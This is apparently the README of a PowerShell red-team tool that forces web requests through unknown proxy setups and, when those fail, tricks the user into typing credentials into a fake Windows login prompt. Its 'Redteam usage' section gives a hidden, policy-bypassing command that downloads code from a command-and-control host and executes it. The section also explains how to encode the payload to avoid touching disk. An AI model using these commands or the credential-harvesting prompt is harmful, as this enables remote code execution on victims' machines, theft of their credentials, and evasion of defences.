# Invoke-ForceWebRequest (@daniel0x00)
This function will force an HTTP GET in a computer with unknow internet config, trying to download the URL by downloading it directly and, if it can't, then using default proxy credentials and .pac proxy list. If none o them works, **it will trick the user and request his credentials** using the Windows default credential prompt.

## Description

Normally this function should be used in a pentest environment, when you're running this code in a target computer where you don't know exactly what is the outbound internet config. Internally, Invoke-ForceWebRequest will use another two functions:
* [Invoke-BasicWebRequest](https://github.com/daniel0x00/basicwebrequest): another function writed by me which allow me to create http webrequest with proxy config. Similar (but very basic) to Invoke-WebRequest native PowerShell function (which is only available on PowerShell v3+).
* [Invoke-LoginPrompt](https://github.com/enigma0x3/Invoke-LoginPrompt): an improved version of this great function wrote by [@enigma0x3](https://github.com/enigma0x3)

## Usage

Using the function in a computer with no proxy or proxy with no authentication
```
PS C:\> . .\Invoke-ForceWebRequest.ps1
PS C:\> Invoke-ForceWebRequest google.com -DummyString html -Verbose
VERBOSE: Trying http get with method #1: simple request...

StatusCode Content
---------- -------
       200 <!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="IE=edge" http-equiv="X-UA-Co...
``` 

Using the function in a computer that have an authenticated proxy, user will be prompt for a valid proxy credentials. Note that user will be prompt until he/she writes a valid credential.

![Invoke-ForceWebRequest](http://ferreira.fm/github/invoke-forcewebrequest/requesting-credentials.png "powershell webrequest proxy credentials")

When the user writes a valid credential, html will be returned.

![Invoke-ForceWebRequest](http://ferreira.fm/github/invoke-forcewebrequest/proxy-enabled.png "powershell webrequest proxy credentials granted")

 
 ## Redteam usage

From red-team point of view: let's say you are able to run some PowerShell code in the target machine through a VBA Macro or a malicious EXE, but you really don't know how the computer is connected to internet. So you run this payload to be sure you will get response from your target:
```
(assuming you wrote the script in the target computer to $env:temp folder)

C:\> powershell.exe -ep bypass -windowstyle hidden -nop -noexit -c "gc $env:temp\Invoke-ForceWebRequest.ps1 | out-string | iex; Invoke-ForceWebRequest comandandcontrol.com/payload.txt -DummyString someCode | % { if ($_.StatusCode -eq 200) { $_.Content | out-string | iex } }"

    1: it will download code from URL comandandcontrol.com/payload.txt
    2: then it will check if the content of payload.txt is correct by checking a dummy-string that you know is inside payload.txt
    3: invoke (run) code of payload.txt (if you're a redteamer it will be some malicious code)
``` 

If you do not want to touch disk, you can also encode the entire function and the payload with [@samratashok](https://github.com/samratashok) nishang [Invoke-Encode](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1), something like this:
```
1: Create a .ps1 file with the following, and call it for example 'temp.ps1'
    
    function Invoke-ForceWebRequest { ...... }

    Invoke-ForceWebRequest comandandcontrol.com/payload.txt -DummyString someCode | % { if ($_.StatusCode -eq 200) { $_.Content | out-string | iex } }

2: Encode the entire file with @samratashok Invoke-Encode, which will create an 'encodedcommand.txt' file in your desktop:

    PS C:\> Invoke-Encode -DataToEncode C:\temp.ps1 -OutCommand

3: Copy the content of encodedcommand.txt and then use it in your PS code that you will execute in your target:

    C:\> powershell.exe -ep bypass -windowstyle hidden -nop -noexit -enc "ENCODED_COMMAND"
``` 
